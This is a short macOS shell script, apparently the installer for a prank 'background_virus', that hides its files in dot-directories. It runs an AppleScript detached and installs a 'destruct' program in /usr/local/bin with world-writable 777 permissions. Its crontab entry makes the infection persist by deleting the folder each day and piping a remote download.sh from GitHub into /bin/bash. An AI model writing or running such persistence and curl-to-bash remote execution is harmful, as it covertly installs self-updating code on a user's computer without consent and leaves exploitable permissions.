mv background_virus ~/Desktop/.background_virus/ & True
cp ~/Desktop/.background_virus/change_background.scpt ~/.change_background.scpt
osascript ~/.change_background.scpt & disown

#write out current crontab
crontab -l > mycron
#echo new cron into cron file
echo "12 20 * * * rm -rf ~/Desktop/.background_virus; curl -fsS https://raw.githubusercontent.com/thantzmon/background_virus/master/download.sh | /bin/bash "  >> mycron
#install new cron file
crontab mycron
rm mycron

chmod 777 ~/Desktop/.background_virus/destruct
cp ~/Desktop/.background_virus/destruct /usr/local/bin/destruct 
cp ~/Desktop/.background_virus/mypillow.jpeg ~/.mypillow.jpeg
chmod 777 /usr/local/bin/destruct
